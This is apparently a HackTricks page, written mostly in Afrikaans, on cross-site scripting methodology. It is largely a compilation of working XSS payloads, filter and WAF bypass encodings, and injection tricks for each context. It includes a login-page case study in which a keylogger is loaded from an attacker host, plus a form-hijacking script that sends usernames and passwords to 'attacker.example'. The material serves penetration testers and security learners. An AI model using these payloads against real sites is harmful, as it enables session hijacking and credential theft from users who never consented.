# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Kontroleer of **enige waarde wat jy beheer** (_parameters_, _path_, _headers_?, _cookies_?) **weerkaats** in die HTML of **gebruik** word deur **JS**-kode.
2. Vind die **konteks** waar dit weerkaats/gebruik word.
3. As dit **reflected**
   1. Kontroleer **watter simbole jy kan gebruik** en, afhangend daarvan, berei die payload voor:
      1. In **ruwe HTML**:
         1. Kan jy nuwe HTML tags skep?
         2. Kan jy events of attributes gebruik wat die `javascript:` protocol ondersteun?
         3. Kan jy beskermings omseil?
         4. Word die HTML-inhoud geïnterpreteer deur enige client-side JS engine (_AngularJS_, _VueJS_, _Mavo_...), wat jy kan misbruik met 'n [**Client Side Template Injection**](../client-side-template-injection-csti.md).
         5. As jy nie HTML tags kan skep wat JS-kode uitvoer nie, kan jy dalk 'n [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html) misbruik?
      2. Binne 'n **HTML tag**:
         1. Kan jy uitkom na die ruwe HTML-konteks?
         2. Kan jy nuwe events/attributes skep om JS-kode uit te voer?
         3. Ondersteun die attribuut waarin jy vasgevang is JS-uitvoering?
         4. Kan jy beskermings omseil?
      3. Binne **JavaScript-kode**:
         1. Kan jy die `<script>` tag escape?
         2. Kan jy die string ontsnap en ander JS-kode uitvoer?
         3. Is jou insette in template literals \`\`?
         4. Kan jy beskermings omseil?
      4. Javascript **funksie** wat **uitgevoer** word
         1. Jy kan die naam van die funksie aandui wat uitgevoer moet word. bv.: `?callback=alert(1)`
4. As dit **used**
   1. Jy kan 'n **DOM XSS** misbruik; let goed op hoe jou insette beheer word en of jou **beheerde insette deur enige sink** gebruik word.

Wanneer jy aan 'n komplekse XSS werk, kan dit interessant wees om te kyk na:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Weerkaatste waardes

Om 'n XSS suksesvol uit te buiten, is die eerste ding wat jy moet vind 'n **waarde wat jy beheer en wat in die webbladsy weerkaats word**.

- **Intermediêr weerkaats**: As jy vind dat die waarde van 'n parameter of selfs die path in die webbladsy weerkaats word, kan jy 'n **Reflected XSS** uitbuit.
- **Gestoor en weerkaats**: As jy vind dat 'n waarde wat jy beheer op die bediener gestoor word en elke keer as 'n bladsy geraadpleeg word weerkaats word, kan jy 'n **Stored XSS** uitbuit.
- **Toeganklik via JS**: As jy vind dat 'n waarde wat jy beheer deur JS geraadpleeg word, kan jy 'n **DOM XSS** uitbuit.

## Kontekste

Wanneer jy probeer om 'n XSS uit te buit, is die eerste ding wat jy moet weet waar jou insette weerkaats word. Afhangend van die konteks sal jy op verskillende maniere arbitraire JS-kode kan uitvoer.

### Ruwe HTML

As jou insette **op die ruwe HTML** weerkaats word, sal jy 'n **HTML tag** moet misbruik om JS-kode uit te voer: `<img , <iframe , <svg , <script` ... dit is net 'n paar van die vele moontlike HTML tags wat jy kan gebruik.\
Onthou ook [Client Side Template Injection](../client-side-template-injection-csti.md).

### Binne HTML tag-attribute

As jou insette binne die waarde van 'n attribuut van 'n tag weerkaats word, kan jy probeer:

1. Om **uit te ontsnap uit die attribuut en uit die tag** (dan is jy in die ruwe HTML) en 'n nuwe HTML tag te skep om te misbruik: `"><img [...]`
2. As jy **uit die attribuut kan ontsnap maar nie uit die tag nie** (`>` is encoded of verwyder), kan jy, afhangend van die tag, 'n **event** skep wat JS-kode uitvoer: `" autofocus onfocus=alert(1) x="`
3. As jy **nie uit die attribuut kan ontsnap nie** (`"` word ge-encode of verwyder), dan sal, afhangend van **watter attribuut** jou waarde in weerspieël word en of jy die hele waarde of net 'n deel beheer, jy dit kan misbruik. Byvoorbeeld, as jy 'n event soos `onclick=` beheer, sal jy dit kan laat uitvoer wanneer dit geklik word. 'n Ander interessante voorbeeld is die attribuut `href`, waar jy die `javascript:` protocol kan gebruik om arbitraire kode uit te voer: **`href="javascript:alert(1)"`**
4. As jou insette binne "**onuitputbare tags**" weerkaats word, kan jy die **`accesskey`** truuk probeer om die vuln te misbruik (jy sal 'n vorm van social engineering nodig hê om dit uit te buit): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

'n Korporatiewe SSO login-bladsy het die OAuth `service` parameter binne die `href` attribuut van `<a id="forgot_btn" ...>` weergegee. Alhoewel `<` en `>` HTML-geenkodeer was, was dubbel-aanhalingstekens nie, so die aanvaller kon die attribuut sluit en dieselfde element hergebruik om handlers soos `" onfocus="payload" x="` in te voeg.

1. Inject die handler: Eenvoudige payloads soos `onclick="print(1)"` is geblokkeer, maar die WAF het slegs die eerste JavaScript-stelling in inline attributes geïnspekteer. Deur 'n skadelose uitdrukking in hakies te voorsit, gevolg deur 'n semikolon, het dit die regte payload toegelaat om uit te voer: `onfocus="(history.length);malicious_code_here"`.
2. Auto-trigger dit: Browsers fokus enige element waarvan die `id` ooreenstem met die fragment, so die byvoeging van `#forgot_btn` by die eksploit-URL dwing die anchor om by bladsylaai gefokus te word en hardloop die handler sonder 'n klik.
3. Hou die inline stub klein: Die teiken het reeds jQuery. Die handler moes net 'n aanvraag bootstrap via `$.getScript(...)` terwyl die volle keylogger op die aanvaller se bediener gehuisves was.

**Boude stringe sonder aanhalingstekens**

Single quotes is URL-geenkodeer teruggestuur en ontsnapte dubbel-aanhalingstekens het die attribuut beskadig, so die payload het elke string gegenereer met `String.fromCharCode`. 'n Hulp-funksie maak dit maklik om enige URL in char-kodes om te skakel voordat jy dit in die attribuut plak:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
’n Resulterende attribuut het soos volg gelyk:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Waarom dit inlogbewyse steel**

Die eksterne script (gelaai vanaf 'n aanvaller-beheerde host of Burp Collaborator) het `document.onkeypress` gehook, toetsaanslae gebuffer, en elke sekonde `new Image().src = collaborator_url + keys` uitgevoer. Omdat die XSS slegs vir nie-geauthentiseerde gebruikers afgaan, is die sensitiewe aksie die login-formulier self — die aanvaller keylogs gebruikersname en wagwoorde, selfs al druk die slagoffer nooit "Login" nie.

Vreemde voorbeeld van Angular wat XSS uitvoer as jy 'n klasnaam beheer:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Binne JavaScript-kode

In hierdie geval word jou insette weerspieël tussen **`<script> [...] </script>`** tags van 'n HTML-bladsy, binne 'n `.js`-lêer of binne 'n attribuut wat die **`javascript:`** protokol gebruik:

- As dit weerspieël word tussen **`<script> [...] </script>`** tags, selfs al is jou insette binne enige soort aanhalingsteken, kan jy probeer om `</script>` in te voeg en uit hierdie konteks te ontsnap. Dit werk omdat die **blaaier eers die HTML-tags sal parse** en dan die inhoud, daarom sal dit nie opmerk dat jou ingesette `</script>`-tag binne die HTML-kode is nie.
- As dit weerspieël word **binne 'n JS-string** en die laaste truuk werk nie, sal jy die **string moet verlaat**, jou kode **uitvoer** en die JS-kode **herbou** (as daar enige fout is, sal dit nie uitgevoer word nie:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- As dit weerspieël word binne template literals kan jy **JS-uitdrukkings inkorporeer** deur die `${ ... }` sintaks te gebruik: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** werk om **geldige javascript-kode** te skryf:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting verwys na die geleentheid om **funksies, veranderlikes of klasse te declareer nadat dit gebruik is sodat jy scenario's kan misbruik waar 'n XSS ongedeklere veranderlikes of funksies gebruik.**\
**Kyk na die volgende bladsy vir meer inligting:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Verskeie webblaaie het endpoints wat **as parameter die naam van die funksie aanvaar wat uitgevoer moet word**. 'n Algemene voorbeeld in die veld is iets soos: `?callback=callbackFunc`.

'n Goeie manier om uit te vind of iets wat direk deur die gebruiker gegee word probeer uitgevoer te word, is deur **die parameterwaarde te verander** (byvoorbeeld na 'Kwetsbaar') en in die console te kyk vir foute soos:

![](<../../images/image (711).png>)

As dit kwetsbaar is, kan jy moontlik **'n alert uitlok** deur net die waarde te stuur: **`?callback=alert(1)`**. Dit is egter baie algemeen dat hierdie endpoints die inhoud **valideer** om slegs letters, syfers, kolletjies en onderstreepies toe te laat (**`[\w\._]`**).

Tog is dit, selfs met daardie beperking, steeds moontlik om sekere aksies uit te voer. Dit is omdat jy daardie geldige karakters kan gebruik om **toegang tot enige element in die DOM** te kry:

![](<../../images/image (747).png>)

Sommige nuttige funksies hiervoor:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Jy kan ook probeer om **Javascript functions** direk te trigger: `obj.sales.delOrders`.

Ewenwel, gewoonlik is die endpoints wat die aangeduide funksie uitvoer endpoints sonder baie interessante DOM; **ander bladsye in dieselfde origin** sal 'n **meer interessante DOM** hê om meer aksies uit te voer.

Daarom, om hierdie kwetsbaarheid in 'n ander DOM te misbruik, is die **Same Origin Method Execution (SOME)** exploitation ontwikkel:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Daar is **JS code** wat **onveilig** sekere **data wat deur 'n aanvaller beheer word** gebruik, soos `location.href`. 'n Aanvaller kan dit misbruik om arbitrêre JS-kode uit te voer.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Hierdie tipe XSS kan **ooral** gevind word. Hulle is nie net afhanklik van die client exploitation van 'n webtoepassing nie maar van **enige** **konteks**. Hierdie tipe **arbitrêre JavaScript execution** kan selfs misbruik word om **RCE** te verkry, **arbitrêre** **files** in kliënte en servers te lees, en meer.\
Sommige **voorbeelde**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

As jou invoer gereflekteer word **binne die HTML page**, of as jy kan ontsnap en HTML-kode in hierdie konteks kan inject, is die **eerste** ding wat jy moet doen om te kyk of jy `<` kan misbruik om nuwe tags te skep: probeer net daardie **karakter** te **weerspieël** en kyk of dit **HTML encoded** word, **verwyder** word, of **sonder veranderinge weerspieël** word. **Slegs in laasgenoemde geval sal jy hierdie geval kan uitbuit**.\
Vir hierdie gevalle hou ook **in gedagte** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Let wel: 'n HTML comment kan gesluit word deur gebruik te maak van\*\***\***\*`-->`\*\***\***\*of \*\***`--!>`\*\*_

In hierdie geval en as geen black/whitelisting gebruik word nie, kan jy payloads soos:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Maar, as tags/attributes swart-/witlys gebruik word, sal jy moet **brute-force watter tags** jy kan skep.\
Sodra jy **gevind het watter tags toegelaat word**, sal jy die **brute-force attributes/events** binne die gevonde geldige tags moet uitvoer om te sien hoe jy die konteks kan aanval.

### Tags/Events brute-force

Gaan na [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) en klik op _**Copy tags to clipboard**_. Dan stuur jy almal met Burp intruder en kyk of enige tags nie deur die WAF as kwaadwillig bespeur is nie. Sodra jy ontdek het watter tags jy kan gebruik, kan jy **brute force all the events** met die geldige tags (op dieselfde webblad klik op _**Copy events to clipboard**_ en volg dieselfde prosedure as voorheen).

### Pasgemaakte tags

As jy nie enige geldige HTML-tag gevind het nie, kan jy probeer om 'n **pasgemaakte tag te skep** en JS code uit te voer met die `onfocus` attribute. In die XSS-versoek moet jy die URL met `#` eindig om die bladsy op daardie objek te **focus** en die kode te **execute**:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Swartlys-omseilings

As 'n swartlys gebruik word, kan jy dit probeer omseil met 'n paar eenvoudige truuks:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Lengte bypass (klein XSSs)

> [!NOTE] > **Meer klein XSS vir verskillende omgewings** payload [**kan hier gevind word**](https://github.com/terjanq/Tiny-XSS-Payloads) en [**hier**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Die laaste een gebruik 2 unicode karakters wat uitbrei na 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

As jy, om die kwesbaarheid te exploiteer, die **user to click a link or a form** met vooraf ingevulde data nodig het, kan jy probeer om [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (as die bladsy kwesbaar is).

### Onmoontlik - Dangling Markup

As jy dink dat dit **onmoontlik is om 'n HTML tag met 'n attribute te skep om JS code uit te voer**, moet jy [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)nakyk omdat jy die **vulnerability** **kan exploit** **without** executing **JS** code.

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

As jy binne 'n **HTML tag** is, is die eerste ding wat jy kan probeer om uit die tag te **escape** en sommige van die tegnieke wat in die [previous section](#injecting-inside-raw-html) genoem word te gebruik om **JS** code uit te voer.\
As jy **cannot escape from the tag**, kan jy nuwe attributes binne die tag skep om te probeer om **JS** code uit te voer, byvoorbeeld deur 'n payload soos (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Stylgebeurtenisse**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Binne die attribuut

Selfs al **kan jy nie uit die attribuut ontsnap nie** (`"` word gekodeer of verwyder), afhangende van **in watter attribuut** jou waarde gereflekteer word en **of jy die hele waarde of net 'n deel daarvan beheer**, sal jy dit kan misbruik. Byvoorbeeld, as jy 'n event soos `onclick=` beheer sal jy dit kan laat uitvoer van ewekansige kode wanneer daar op geklik word.\
Nog 'n interessante **voorbeeld** is die attribuut `href`, waar jy die `javascript:`-protokol kan gebruik om ewekansige kode uit te voer: **`href="javascript:alert(1)"`**

**Bypass binne die event deur HTML encoding/URL encode te gebruik**

Die **HTML encoded characters** binne die waarde van HTML-tags se attributte word **gedekodeer tydens runtime**. Daarom sal iets soos die volgende geldig wees (die payload is in bold): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Let wel dat **any kind of HTML encode is valid**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Let wel dat URL encode ook sal werk:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass binne event met Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Spesiale protokolle binne die attribuut

Daar kan jy die protokolle **`javascript:`** of **`data:`** gebruik op sekere plekke om **arbitrêre JS-kode uit te voer**. Sommige sal gebruikersinteraksie vereis; ander nie.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Plekke waar jy hierdie protokolle kan inspuit**

**Oor die algemeen** kan die `javascript:`-protokol **gebruik word in enige tag wat die attribuut `href` aanvaar** en in **die meeste** van die tags wat die attribuut `src` aanvaar (maar nie `<img>` nie)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Ander obfuskeringstrieke**

_**In hierdie geval is die HTML encoding- en die Unicode encoding-truukke uit die vorige afdeling ook geldig, aangesien jy binne 'n attribuut is.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Verder is daar nog 'n **nuttige truuk** vir hierdie gevalle: **Selfs al word jou inset binne `javascript:...` URL encoded, sal dit URL decoded word voordat dit uitgevoer word.** Dus, as jy van die **string** moet **escape** met 'n **single quote** en jy sien dat **dit URL encoded word**, onthou dat **dit nie saak maak nie,** dit sal tydens die **uitvoering** as 'n **single quote** **geïnterpreteer** word.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Let wel dat as jy probeer om **beide** `URLencode + HTMLencode` in enige volgorde te gebruik om die **payload** te enkodeer, sal dit **nie** **werk** nie, maar jy kan dit **in die payload meng**.

**Gebruik Hex and Octal encode met `javascript:`**

Jy kan **Hex** en **Octal encode** binne die `src`-attribuut van `iframe` (ten minste) gebruik om **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
As jy enige URL in 'n willekeurige **`<a href=`** tag kan invoeg wat die **`target="_blank" and rel="opener"`** attributes bevat, kyk na die **volgende bladsy om hierdie gedrag uit te buit**:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Eerstens, kyk na hierdie bladsy ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) vir nuttige **"on" event handlers**.\
Indien daar 'n swartlys is wat jou verhoed om hierdie event handlers te skep, kan jy die volgende bypasses probeer:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS in "Onuitbuitbare tags" (hidden input, link, canonical, meta)

Vanaf [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **is dit nou moontlik om hidden inputs te misbruik met:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
En in **meta-tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Vanaf [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Jy kan 'n **XSS payload inside a hidden attribute** uitvoer, mits jy die **victim** kan **persuade** om die **key combination** te druk. Op Firefox Windows/Linux is die sleutelkombinasie **ALT+SHIFT+X** en op OS X is dit **CTRL+ALT+X**. Jy kan 'n ander sleutelkombinasie spesifiseer deur 'n ander sleutel in die access key attribute te gebruik. Hier is die vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Die XSS payload sal iets soos die volgende wees: `" accesskey="x" onclick="alert(1)" x="`**

### Swartlys-omseilings

Verskeie truuks wat verskillende enkodering gebruik is reeds in hierdie afdeling blootgelê. Gaan **terug om te leer waar jy dit kan gebruik:**

- **HTML enkodering (HTML tags)**
- **Unicode enkodering (kan geldige JS code wees):** `\u0061lert(1)`
- **URL enkodering**
- **Hex en Oktale enkodering**
- **data enkodering**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

If you found a **XSS in a very small part** of the web that requires some kind of interaction (maybe a small link in the footer with an onmouseover element), you can try to **modify the space that element occupies** to maximize the probabilities of have the link fired.

For example, you could add some styling in the element like: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

But, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, for example

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

Now you can modify our link and bring it to the form

> \<a href="" id=someid class=test onclick=alert() a="">

This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Invoeging binne JavaScript code

In hierdie geval is jou **input** going to be **reflected inside the JS code** of a `.js` file or between `<script>...</script>` tags or between HTML events that can execute JS code or between attributes that accepts the `javascript:` protocol.

### Ontsnapping van die \<script> tag

As jou code binne `<script> [...] var input = 'reflected data' [...] </script>` ingevoeg word, kan jy maklik die **sluiting van die `<script>` tag ontsnap**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Let wel dat ons in hierdie voorbeeld **nie eers die enkele aanhalingsteken gesluit het nie**. Dit is omdat **HTML parsing is performed first by the browser**, wat behels dat bladsyelemente geïdentifiseer word, insluitend blokke van script. Die ontleding van JavaScript om die ingeslote scripts te verstaan en uit te voer, word eers daarna uitgevoer.

### Binne JS code

As `<>` gesanitiseer word, kan jy steeds die **string ontsnap** waar jou insette **geposisioneer** is en **arbitraire JS uitvoer**. Dit is belangrik om die **JS-sintaksis reg te stel**, want as daar foute is, sal die JS-kode nie uitgevoer word nie:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Wanneer gebruikerinvoer binne ’n aangehaalde JavaScript-string beland (bv. server-side echo in ’n inline script), kan jy die string beëindig, inject code, en die sintaksis herstel om parsing geldig te hou. Generieke geraamte:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Voorbeeld-URL-patroon wanneer die kwesbare parameter in 'n JS-string weerspieël word:
```
?param=test";<INJECTION>;a="
```
Dit voer aanvaller JS uit sonder om die HTML-konteks te raak (suiwer JS-in-JS). Kombineer dit met die blacklist bypasses hieronder wanneer filters sleutelwoorde blokkeer.

### Template literals ``

Om **strings** te bou, afgesien van enkel- en dubbel-aanhalingstekens, aanvaar JS ook **backticks** **` `` `**. Dit staan bekend as template literals aangesien dit toelaat om **embedded JS expressions** met die `${ ... }` sintaksis te gebruik.\
Daarom, as jy sien dat jou insette **weerspieël** word binne 'n JS-string wat backticks gebruik, kan jy die sintaks `${ ... }` misbruik om **arbitrary JS code** uit te voer:

Dit kan **misbruik** word met:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Gekodeerde kode-uitvoering
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Aflewerbare payloads met eval(atob()) en scope-nuanses

Om URLs korter te hou en naïewe sleutelwoordfilters te omseil, kan jy jou werklike logika base64-enkodeer en dit evalueer met `eval(atob('...'))`. As eenvoudige sleutelwoordfiltrering identifiseerders soos `alert`, `eval`, of `atob` blokkeer, gebruik Unicode-gescapeerde identifiseerders wat identies in die blaaier kompileer maar string-vergelykingsfilters omseil:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Belangrike skopingsnuans: `const`/`let` wat binne `eval()` gedeclareer word is block-scoped en skep NIE globals nie; hulle sal nie toeganklik wees vir later skripte nie. Gebruik 'n dinamies ingespuitde `<script>` element om globale, nie-herbindbare hooks te definieer wanneer nodig (bv. om 'n form handler te hijack):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Verwysing: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode JS uitvoering
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists tegnieke

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
